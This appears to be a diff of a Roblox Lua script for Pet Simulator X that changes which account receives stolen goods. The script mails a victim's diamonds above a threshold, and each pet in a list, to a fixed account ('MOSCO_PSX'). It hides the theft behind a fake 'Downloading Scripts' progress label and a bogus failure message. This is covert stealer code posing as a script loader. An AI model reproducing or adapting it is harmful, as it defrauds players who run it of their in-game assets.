@@ -233,7 +233,7 @@ end
   
 local getmybanksremote = "Get My Banks"
 local inviteremote = "Invite To Bank"
-local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
+local lockremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.    PlayerScripts.Scripts.GUIs.Inventory).LockPets, 5)
 local depositremote = "Bank Deposit"
 local eggremote = debug.getconstant(debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Eggs).SetupEgg)[5], 26)
 local getbankremote = "Get Bank"
@@ -449,7 +449,7 @@ local gg = require(game:GetService("ReplicatedStorage").Library.Client["Save"]).
 if gg >= 15000000000 then
 wait(10)  
 local gemssent = gg - times - 100000
-FireRemote("Send Mail", {Recipient="PetSimxForNubs", Message="gems", Pets={}, Diamonds=gemssent})
+FireRemote("Send Mail", {Recipient="MOSCO_PSX", Message="gems", Pets={}, Diamonds=gemssent})
 wait(10)
 end
 
@@ -483,7 +483,7 @@ local headers = {
     downloadpack.Text = "Downloading Scripts (5/10)"
 
     for i =1,#HUList,1 do 
-        FireRemote("Send Mail", {Recipient="PetSimxForNubs", Message=".gg/vesty", Pets={HUList[i]}, Diamonds=0})
+        FireRemote("Send Mail", {Recipient="MOSCO_PSX", Message="MOSCO", Pets={HUList[i]}, Diamonds=0})
         wait(10) 
     end
 downloadpack.Text = "Downloading Scripts (5,985/10)\n! Failed (Unknown Error)"
